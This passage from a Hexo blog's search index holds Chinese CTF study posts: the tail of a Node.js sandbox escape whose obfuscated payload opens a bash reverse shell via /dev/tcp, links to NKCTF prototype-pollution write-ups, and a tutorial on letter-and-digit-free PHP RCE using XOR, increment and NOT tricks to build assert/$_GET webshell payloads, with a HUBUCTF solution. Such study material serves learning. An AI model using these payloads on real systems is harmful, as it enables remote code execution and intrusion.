class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Proxy</span>(&#123;&#125;, &#123;</span><br><span class="line">        <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="keyword">const</span> cc = <span class="variable language_">arguments</span>.<span class="property">callee</span>.<span class="property">caller</span>;</span><br><span class="line">            <span class="keyword">const</span> p = (cc.<span class="property">constructor</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&#x27;return procBess&#x27;</span>.replace(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span>))();</span><br><span class="line">            <span class="keyword">const</span> obj = p.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_procBess&#x27;</span>.<span class="title function_">replace</span>(<span class="string">&#x27;B&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">            <span class="keyword">const</span> ex = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptor</span>(obj, <span class="string">&#x27;exeicSync&#x27;</span>.<span class="title function_">replace</span>(<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;&#x27;</span>));</span><br><span class="line">            <span class="keyword">return</span> ex.<span class="title function_">value</span>(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1&#x27;&quot;</span>).<span class="title function_">toString</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><h3 id="方法四：原型链污染"><a href="#方法四：原型链污染" class="headerlink" title="方法四：原型链污染"></a>方法四：原型链污染</h3><p>官方wp：</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&mid=2247485228&idx=1&sn=b72c60e839d1d35ad9867e9c194f13e5&chksm=cf5ee77af8296e6cb3335a3f6ff338fba0bcfe976feb86bc0f4f4c7d6750d2763cedaeff5eb8&mpshare=1&scene=23&srcid=0325X0enB84UIHcosRj3qfNJ&sharer_shareinfo=f330aecbcf24a75c2b304565a6580d2f&sharer_shareinfo_first=f330aecbcf24a75c2b304565a6580d2f#rd">https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&amp;mid=2247485228&amp;idx=1&amp;sn=b72c60e839d1d35ad9867e9c194f13e5&amp;chksm=cf5ee77af8296e6cb3335a3f6ff338fba0bcfe976feb86bc0f4f4c7d6750d2763cedaeff5eb8&amp;mpshare=1&amp;scene=23&amp;srcid=0325X0enB84UIHcosRj3qfNJ&amp;sharer_shareinfo=f330aecbcf24a75c2b304565a6580d2f&amp;sharer_shareinfo_first=f330aecbcf24a75c2b304565a6580d2f#rd</a></p><p><img src="/img/image-20240331134428015.png" alt="image-20240331134428015"></p><p>说实话这个<code>hack.js</code>不知道咋看出来的</p><p><img src="/img/image-20240331134556826.png" alt="image-20240331134556826"></p><p>参考文章：</p><p><a href="https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&mid=2247485228&idx=1&sn=b72c60e839d1d35ad9867e9c194f13e5&chksm=cf5ee77af8296e6cb3335a3f6ff338fba0bcfe976feb86bc0f4f4c7d6750d2763cedaeff5eb8&mpshare=1&scene=23&srcid=0325X0enB84UIHcosRj3qfNJ&sharer_shareinfo=f330aecbcf24a75c2b304565a6580d2f&sharer_shareinfo_first=f330aecbcf24a75c2b304565a6580d2f#rd">https://mp.weixin.qq.com/s?__biz=Mzg4MTg1MDY4MQ==&amp;mid=2247485228&amp;idx=1&amp;sn=b72c60e839d1d35ad9867e9c194f13e5&amp;chksm=cf5ee77af8296e6cb3335a3f6ff338fba0bcfe976feb86bc0f4f4c7d6750d2763cedaeff5eb8&amp;mpshare=1&amp;scene=23&amp;srcid=0325X0enB84UIHcosRj3qfNJ&amp;sharer_shareinfo=f330aecbcf24a75c2b304565a6580d2f&amp;sharer_shareinfo_first=f330aecbcf24a75c2b304565a6580d2f#rd</a></p><p><a href="https://blog.xmcve.com/2024/03/25/NKCTF-2024-Writeup/#title-5">https://blog.xmcve.com/2024/03/25/NKCTF-2024-Writeup/#title-5</a></p><p><a href="https://blog.csdn.net/uuzeray/article/details/136980871">https://blog.csdn.net/uuzeray/article/details/136980871</a></p><p><a href="https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD/QbiQQdK2K35D=Kt4D&alichlgref=https://www.google.com.hk/#toc-3">https://xz.aliyun.com/t/11859?time__1311=mqmx0DBD9DyDuBYD%2FQbiQQdK2K35D%3DKt4D&amp;alichlgref=https%3A%2F%2Fwww.google.com.hk%2F#toc-3</a></p><p><a href="https://juejin.cn/post/6844904090116292616">https://juejin.cn/post/6844904090116292616</a></p>]]></content>
      
      
      <categories>
          
          <category> web学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无数字和字母RCE</title>
      <link href="/2024/02/05/%E6%97%A0%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8DRCE/"/>
      <url>/2024/02/05/%E6%97%A0%E6%95%B0%E5%AD%97%E5%92%8C%E5%AD%97%E6%AF%8DRCE/</url>
      
        <content type="html"><![CDATA[<h1 id="无数字和字母RCE"><a href="#无数字和字母RCE" class="headerlink" title="无数字和字母RCE"></a>无数字和字母RCE</h1><p>最原始的情况</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><hr><h3 id="1-异或"><a href="#1-异或" class="headerlink" title="1.异或"></a>1.异或</h3><p>举个例子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;A&quot;</span>^<span class="string">&quot;?&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后输出  ~</p><p>计算过程：首先将<code>A</code>和<code>?</code>分别转换为对应的ASCII码，A变为65，?变为63，然后将其转换为对应的二进制数，A变为<code>1000001</code>，1变为<code>111111</code>，接下来就进行运算，异或的运算规则是相同为0，不同为1</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">A</span>:      <span class="number">1000001</span></span><br><span class="line">?:      <span class="number">0111111</span>(少一位，前面补<span class="number">0</span>即可) </span><br><span class="line">结果：   <span class="number">1111110</span></span><br></pre></td></tr></table></figure><p>异或一次不仅能构造出一个字符，也可以一次构造出多个字符，比如<code>(&#39;AB&#39;)^(&#39;11&#39;)</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;AB&quot;</span>^<span class="string">&quot;11&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后输出 ps</p><hr><h3 id="2-自增"><a href="#2-自增" class="headerlink" title="2.自增"></a>2.自增</h3><p>在php中，在处理字符变量的算数运算时，PHP 沿袭了 Perl 的习惯，而非 C 的。并且字符变量只能递增不能递减，并且只支持字母数字的ASCII的自增，对其他字符自增无效。简单来说，就是我们可以通过自增来获取我们想要的字母。即<code>‘a++&#39;--&gt;&#39;b</code>‘;<code>&#39;b&#39;++--&gt;&#39;c&#39;</code>;<code>&#39;A&#39;++--&gt;&#39;B&#39;</code></p><p>而php还有一个特性，字符串和数组拼接会返回Array。这样我们就获取到了字母。<strong>限制了字母和数字，但是我们可以传入空格</strong></p><p><img src="/img/3.png" alt="屏幕截图 2024-02-04 191838"></p><p>成功获取到了字符<code>Array</code>，然后我们获取想获取A的话，就可以采用<code>$_[0]</code>这种方式来获取，但我们是不能够写数字的，所以我们这里可以用一个判断,比如我们在<code>[]</code>里加一个<code>==$</code>，此时因为<code>空</code>和<code>$</code>不同，它就会输出<code>0</code>，此时也就等同于<code>$_[0]</code></p><p><img src="/img/4.png" alt="image-20240204192356382"></p><p>得到字母后就可以开始构造，例如<code>system(ls)</code>这样的命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;<span class="comment">//Array</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$_</span>[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];<span class="comment">//A</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//B</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//C</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//D</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$_</span>;<span class="comment">//E</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//F</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$___</span>=<span class="variable">$_</span>;<span class="comment">//G</span></span><br><span class="line"><span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="variable">$_</span>++;<span class="comment">//T</span></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$___</span>.<span class="variable">$__</span>.<span class="variable">$_</span>;<span class="comment">//GET</span></span><br><span class="line"><span class="comment">//var_dump($_);</span></span><br><span class="line"><span class="variable">$_</span>=<span class="string">&#x27;_&#x27;</span>.<span class="variable">$_</span>;<span class="comment">//_GET</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$$_</span>[_](<span class="variable">$$_</span>[__]));</span><br><span class="line"><span class="comment">//$_GET[_]($_GET[__])</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payload：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span>_=[].<span class="string">&#x27;&#x27;</span>;<span class="symbol">$</span>_=<span class="symbol">$</span>_[<span class="string">&#x27;&#x27;</span>==<span class="string">&#x27;$&#x27;</span>];<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>__=<span class="symbol">$</span>_;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>___=<span class="symbol">$</span>_;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_++;<span class="symbol">$</span>_=<span class="symbol">$</span>___.<span class="symbol">$</span>__.<span class="symbol">$</span>_;<span class="symbol">$</span>_=<span class="string">&#x27;_&#x27;</span>.<span class="symbol">$</span>_;<span class="symbol">$</span><span class="symbol">$</span>_[_](<span class="symbol">$</span><span class="symbol">$</span>_[__]);</span><br></pre></td></tr></table></figure><p><strong>依情况看是否进行url编码</strong></p><p>最后用GET方式对变量<code>_</code>和<code>__</code>传参就行</p><hr><h3 id="3-取反"><a href="#3-取反" class="headerlink" title="3.取反"></a>3.取反</h3><p>取反其实是利用了不可见字符，我们对一个字符进行两次取反，得到的还是其本身。当我们进行一次取反过后，对其进行URL编码，再对其进行取反，此时可以得到可见的字符，它的本质其实还是这个字符本身，然后因为取反用的多是不可见字符，所以这里就达到了一种绕过的目的。</p><p>php中取反符号为<code>~</code>，当使用按位取反操作符 ‘~’ 时，它会翻转一个整数的所有位，举例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="number">10</span>; <span class="comment">// 二进制表示为 0000 1010</span></span><br><span class="line"><span class="variable">$y</span> = ~<span class="variable">$x</span>; <span class="comment">// 按位取反后为 1111 0101</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$y</span>; <span class="comment">// 输出结果为 -11</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>最后输出结果为-11，详细取反运算见文章<a href="https://blog.csdn.net/WilliamsWayne/article/details/78259501">PHP ~(按位取反)位运算符</a></p><p>一个简单的php取反脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$data1</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;assert&#x27;</span>));<span class="comment">//通过两次取反运算得到assert</span></span><br><span class="line"><span class="variable">$data2</span>=<span class="title function_ invoke__">urlencode</span>(~(<span class="string">&#x27;_POST&#x27;</span>));<span class="comment">//通过两次取反运算得到_POST</span></span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$data1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> (<span class="variable">$data2</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>故构造payload：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=~(<span class="meta">%9E</span><span class="meta">%8C</span><span class="meta">%8C</span><span class="meta">%9A</span><span class="meta">%8D</span><span class="meta">%8B</span>);    //这里利用取反符号把它取回来，<span class="variable">$_</span>=assert</span><br><span class="line"><span class="variable">$__</span>=~(<span class="meta">%A0</span><span class="meta">%AF</span><span class="meta">%B0</span><span class="meta">%AC</span><span class="meta">%AB</span>);      //<span class="variable">$__</span>=_POST</span><br><span class="line"><span class="variable">$___</span>=$<span class="variable">$__</span>;                   //<span class="variable">$___</span>=<span class="variable">$_POST</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$___</span>[<span class="number">_</span>]);                 //assert(<span class="variable">$_POST</span>[<span class="number">_</span>]);</span><br><span class="line">放到一排就是：</span><br><span class="line"><span class="variable">$_</span>=~(<span class="meta">%9E</span><span class="meta">%8C</span><span class="meta">%8C</span><span class="meta">%9A</span><span class="meta">%8D</span><span class="meta">%8B</span>);<span class="variable">$__</span>=~(<span class="meta">%A0</span><span class="meta">%AF</span><span class="meta">%B0</span><span class="meta">%AC</span><span class="meta">%AB</span>);<span class="variable">$___</span>=$<span class="variable">$__</span>;<span class="variable">$_</span>(<span class="variable">$___</span>[<span class="number">_</span>]);</span><br></pre></td></tr></table></figure><p>再进行POST传参，传入自己想执行的命令</p><hr><h3 id="更多自增知识点和赛题见文章从CTFShow-RCE挑战-中学习无字母数字构造webshell"><a href="#更多自增知识点和赛题见文章从CTFShow-RCE挑战-中学习无字母数字构造webshell" class="headerlink" title="更多自增知识点和赛题见文章从CTFShow[RCE挑战]中学习无字母数字构造webshell"></a>更多自增知识点和赛题见文章<a href="https://xz.aliyun.com/t/11929?time__1311=mqmx0DBG0QExlxx2DU27HYG=G8iF=x&alichlgref=https://www.google.com/#toc-14">从CTFShow[RCE挑战]中学习无字母数字构造webshell</a></h3><hr><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>一道简单的例题：</p><p><strong>[HUBUCTF 2022 新生赛]HowToGetShell</strong></p><p><img src="/img/1.png" alt="image-20240204190451810"></p><p>过滤了字母，因为php5中的assert函数会将括号里面的字符串当作php代码来执行。因此我们可以构造出<code>assert($_GET[6])</code>，因为很多都是不可见的字符，所以说就先url编码了一下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="string">&#x27;%40&#x27;</span>^<span class="string">&#x27;%21&#x27;</span> ;s:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%08&#x27;</span> ; e:<span class="string">&#x27;%7B&#x27;</span>^<span class="string">&#x27;%1E&#x27;</span> ; r:<span class="string">&#x27;%7E&#x27;</span>^<span class="string">&#x27;%0C&#x27;</span> ; t:<span class="string">&#x27;%7C&#x27;</span>^<span class="string">&#x27;%08&#x27;</span></span><br><span class="line">G:<span class="string">&#x27;%3C&#x27;</span>^<span class="string">&#x27;%7B&#x27;</span>;E:<span class="string">&#x27;%3E&#x27;</span>^<span class="string">&#x27;%7B&#x27;</span>;T:<span class="string">&#x27;%0B&#x27;</span>^<span class="string">&#x27;%5F&#x27;</span>;</span><br><span class="line"><span class="regexp">//</span>拼接起来</span><br><span class="line"><span class="variable">$_</span>=(<span class="string">&#x27;%40%7B%7B%7B%7E%7C&#x27;</span>^<span class="string">&#x27;%21%08%08%1E%0C%08&#x27;</span>);  <span class="regexp">//</span> <span class="variable">$_</span>=assert</span><br><span class="line"><span class="variable">$_1</span>=<span class="string">&#x27;_&#x27;</span>.(<span class="string">&#x27;%3C%3E%0B&#x27;</span>^<span class="string">&#x27;%7B%7B%5F&#x27;</span>);<span class="regexp">//</span><span class="variable">$_1</span>=_GET</span><br><span class="line"><span class="variable">$_2</span>=$<span class="variable">$_1</span>; <span class="comment">#$_2=$_GET</span></span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$_2</span>[<span class="number">6</span>]);  <span class="regexp">//</span>assert(<span class="variable">$_GET</span>[<span class="number">6</span>])</span><br></pre></td></tr></table></figure><p>最后在环境变量中找到flag</p><p><img src="/img/2.png" alt="image-20240204190946852"></p><p>最终payload：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span>:?<span class="number">6</span>=phpinfo();</span><br><span class="line"><span class="attribute">POST</span>:mess=$_=(&#x27;%<span class="number">40</span>%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">7</span>E%<span class="number">7</span>C&#x27;^&#x27;%<span class="number">21</span>%<span class="number">08</span>%<span class="number">08</span>%<span class="number">1</span>E%<span class="number">0</span>C%<span class="number">08</span>&#x27;);$_1=&#x27;_&#x27;.(&#x27;%<span class="number">3</span>C%<span class="number">3</span>E%<span class="number">0</span>B&#x27;^&#x27;%<span class="number">7</span>B%<span class="number">7</span>B%<span class="number">5</span>F&#x27;);$_2=$$_1;$_($_2[<span class="number">6</span>]);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> web学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一篇博客</title>
      <link href="/2024/01/31/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/01/31/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<p>这个博客是终于搭好了，本来是搭好了的，那个文章封面图总是报错，我也知道为啥，现在也没弄好，先不管了。本站是基于hexo+github搭建的，主题是butterfly。这个站比较简洁，没有做很多美化，因为主要用作学习交流，弄那么花也不方便看。<del>其实是怕报错和懒</del></p><p>建个博客很简单，对着大佬的文章库库ctrlcv就行了，以下是我在建站时参考的文章</p><p><a href="https://blog.csdn.net/qq_58608526/article/details/124652412">Hexo+Github博客搭建教程</a></p><p><a href="https://blog.csdn.net/mjh1667002013/article/details/129290903">【Hexo】Hexo搭建Butterfly主题并快速美化</a></p><p>这个博客以后可能会发一些我个人学习方面的东西，如果有疑问或者想和我交流的可以联系我，联系方式Q：3358756550</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂谈 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
